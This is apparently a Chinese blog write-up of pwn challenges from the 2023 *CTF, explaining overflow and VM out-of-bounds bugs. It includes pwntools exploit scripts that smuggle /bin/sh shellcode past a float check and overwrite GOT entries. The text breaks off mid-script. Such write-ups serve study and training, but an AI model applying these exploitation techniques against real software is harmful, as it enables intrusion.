<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="师傅们tql，题解出的太快了，orz https:&#x2F;&#x2F;github.com&#x2F;sixstars&#x2F;starctf2023&#x2F;tree&#x2F;main fcalcgrxer@Ubantu20 ~&#x2F;s&#x2F;m&#x2F;s&#x2F;fcalc&gt; checksec .&#x2F;fcalc[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;share&#x2F;match&#x2F;startctf&#x2F;fcalc&#x2F;fcalc&amp;#x27;    Arch:     amd64">
<meta property="og:type" content="article">
<meta property="og:title" content="2023 *ctf pwn">
<meta property="og:url" content="https://grxer.gitee.io/2023/08/02/startctf/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="师傅们tql，题解出的太快了，orz https:&#x2F;&#x2F;github.com&#x2F;sixstars&#x2F;starctf2023&#x2F;tree&#x2F;main fcalcgrxer@Ubantu20 ~&#x2F;s&#x2F;m&#x2F;s&#x2F;fcalc&gt; checksec .&#x2F;fcalc[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;share&#x2F;match&#x2F;startctf&#x2F;fcalc&#x2F;fcalc&amp;#x27;    Arch:     amd64">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802164253679.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802163426648.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802155245832.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802165152552.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802170108947.png">
<meta property="article:published_time" content="2023-08-02T03:57:56.000Z">
<meta property="article:modified_time" content="2023-08-04T11:09:59.101Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/08/02/startctf/image-20230802164253679.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2023 *ctf pwn</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/02/house-of-force/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/29/House-Of-Einherjar/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/02/startctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/02/startctf/&text=2023 *ctf pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/02/startctf/&is_video=false&description=2023 *ctf pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 *ctf pwn&body=Check out this article: https://grxer.gitee.io/2023/08/02/startctf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/02/startctf/&title=2023 *ctf pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/02/startctf/&name=2023 *ctf pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/02/startctf/&t=2023 *ctf pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fcalc"><span class="toc-number">1.</span> <span class="toc-text">fcalc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">1.1.</span> <span class="toc-text">方法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">1.2.</span> <span class="toc-text">方法3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#starvm"><span class="toc-number">2.</span> <span class="toc-text">starvm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#drop"><span class="toc-number">3.</span> <span class="toc-text">drop</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2023 *ctf pwn
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-02T03:57:56.000Z" itemprop="datePublished">2023-08-02</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>师傅们tql，题解出的太快了，orz</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2023/tree/main">https://github.com/sixstars/starctf2023/tree/main</a></p>
<h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/s/fcalc&gt; checksec ./fcalc</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/startctf/fcalc/fcalc&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>这里有个溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br></pre></td></tr></table></figure>

<p>然后就是在运算符号为0时会溢出原来定义的函数数组会跳转到0040E0处的数据执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF </span></span><br><span class="line">s = v6;  </span><br><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure>

<p>40E0处存的一个栈地址，栈上是有可执行权限的，可以通过溢出往栈上写shellcode，shellcode按双精度浮点数解释需要满足下面的条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line"><span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/02/startctf/image-20230802164253679.png" alt="image-20230802164253679"></p>
<p>浮点数里有exp阶码全为1，有效数<strong>不全为0</strong>，表示Nan(not a number)</p>
<p>对于nan的一些特性 <strong>x：including NaN and ±∞</strong></p>
<table>
<thead>
<tr>
<th>Comparison</th>
<th>NaN ≥ <em>x</em></th>
<th>NaN ≤ <em>x</em></th>
<th>NaN &gt; <em>x</em></th>
<th>NaN &lt; <em>x</em></th>
<th>NaN &#x3D; <em>x</em></th>
<th>NaN ≠ <em>x</em></th>
</tr>
</thead>
<tbody><tr>
<td>Result</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>True</td>
</tr>
</tbody></table>
<p>所以只要浮点数的高位为0x7ff或0xfff即可</p>
<p>浮点数的低位再利用跳转指令跳转到shellcode即可，大概找到下面可以用的跳转指令</p>
<p><img src="/2023/08/02/startctf/image-20230802163426648.png" alt="image-20230802163426648"></p>
<p><img src="/2023/08/02/startctf/image-20230802155245832.png" alt="image-20230802155245832"></p>
<p><img src="/2023/08/02/startctf/image-20230802165152552.png" alt="image-20230802165152552"></p>
<p>计算偏移 </p>
<p><img src="/2023/08/02/startctf/image-20230802170108947.png" alt="image-20230802170108947"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+2)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0xffffffffffffffb6</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+5)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0xffffffffffffffb3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0x1867)&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0174E)&#x27;)</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\xfF&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#first</span></span><br><span class="line"><span class="comment">#FFFFFFB3</span></span><br><span class="line">call=<span class="string">b&#x27;\xE8\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">jmp=<span class="string">b&#x27;\xE9\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#third</span></span><br><span class="line"><span class="comment"># B6</span></span><br><span class="line"><span class="comment"># jmp=b&#x27;\xEb\xb6&#x27;+b&#x27;beef&#x27;+NaNHeader</span></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+shellcode.ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>)+call)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>根据浮点数的解释规则来看，在有效数都为0时，阶码最小3FF(1023),有效数都为1，最大也就无限接近2，所以阶码最大为1023+log<sub>2</sub>(100&#x2F;2)&#x3D;1,028.643 即404h多</p>
<p>REX前缀的值介于40h到4Fh之间,<strong>一条指令只能有一个REX前缀，必须紧接在指令的第一个操作码字节之前。 REX前缀在其他任何位置都将被忽略。</strong></p>
<p>40的前缀是可以使用的,<strong>当我们用<code>\x40</code>覆盖某些指令时可以转义或被忽略（相当于nop）</strong></p>
<p>这边至少要开头两个0x40才能构成0x404的开头绕过检查，所以单句的payload不能大于6个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi #把rax置零</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 0x68732f</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x6e69</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_sc</span>(<span class="params">ft</span>):</span><br><span class="line">    pd = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0</span>:asm(ft)</span><br><span class="line">        &#125;,filler = <span class="string">&#x27;\x40&#x27;</span>,length=<span class="number">8</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> pd</span><br><span class="line">payload=set_sc(<span class="string">&#x27;xor rsi, rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mul rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mov edi, 0x68732f&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x6e69&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x622f&#x27;</span>)+set_sc(<span class="string">&#x27;push rdi&#x27;</span>)+set_sc(<span class="string">&#x27;mov rdi, rsp&#x27;</span>)+set_sc(<span class="string">&#x27;mov al, 59&#x27;</span>)+set_sc(<span class="string">&#x27;push rax&#x27;</span>)+set_sc(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+payload)</span><br></pre></td></tr></table></figure>

<h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>官方paylaod是构造了jmp 4来跳到下一条指令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(b<span class="string">&quot;\xEB\x02&quot;</span>)</span><br><span class="line"><span class="string">&#x27;   0:   eb 02                   jmp    0x4&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line"><span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line"><span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line"><span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line"><span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line"><span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line"><span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line"><span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line"><span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line"><span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line"><span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br></pre></td></tr></table></figure>

<p>小于四字节的可以用nop来填充</p>
<h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>第一次接触vm pwn，是一个c++写的哈佛架构的虚拟机,c++的stl逆向好难懂,但是vm pwn最主要的就是逆清楚虚拟机结构体和指令操作，难搞哦</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt; codestack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; datastack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt;::iterator ip;</span><br><span class="line">    <span class="type">int</span> reg[<span class="number">14</span>]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* mem;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> eflags;</span><br><span class="line"></span><br><span class="line">&#125; starvm;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> instr_code;<span class="comment">//操作码</span></span><br><span class="line">    <span class="type">int</span> instr_num;<span class="comment">//操作数的个数</span></span><br><span class="line">&#125;instr;</span><br></pre></td></tr></table></figure>

<p>指令储存和数据储存分开，先初始化code后初始化data，然后就是取指令 译码 执行 更新pc的操作</p>
<blockquote>
<p>vector的结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">vector</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9) ; XREF:</span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> _M_start dq ?</span><br><span class="line"><span class="number">00000008</span> _M_finish dq ?</span><br><span class="line"><span class="number">00000010</span> _M_end_of_storage dq ?</span><br><span class="line"><span class="number">00000018</span> <span class="built_in">vector</span> ends</span><br></pre></td></tr></table></figure>
</blockquote>
<p>漏洞是data初始化时没有限制数字，在6 7指令会导致申请的堆的越界读写，10指令没有检查值会寄存器越界覆盖掉mem指针，漏洞都可以造成任意地址读写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> VM_LOAD:<span class="number">6</span></span><br><span class="line">            <span class="comment">// load reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(vmp-&gt;mem == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    vmp-&gt;mem = (<span class="type">unsigned</span> <span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// oob read</span></span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;mem[meml];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_UNLOAD:<span class="number">7</span></span><br><span class="line">            <span class="comment">// unload reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                vmp-&gt;mem[meml] = vmp-&gt;reg[op1];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_MOVINT:</span><br><span class="line">                <span class="comment">// MOVINT reg, int</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>

<p>ex师傅那里的思路就是mallocgot为setvbuf，setvbufgot为system，然后修改sevbuf参数stdin指向字符串sh，最后再把mem指针置零触发maloc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401754&#x27;)</span></span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10  mem=0x404020 setvbufgot</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30910</span>, <span class="comment"># 10    reg[1]=0x30910</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3        reg[0]=mem[0]0x81670-0x30910 system</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7         setvbufgot=system</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10     mem=malloc</span></span><br><span class="line">        <span class="number">0</span>, <span 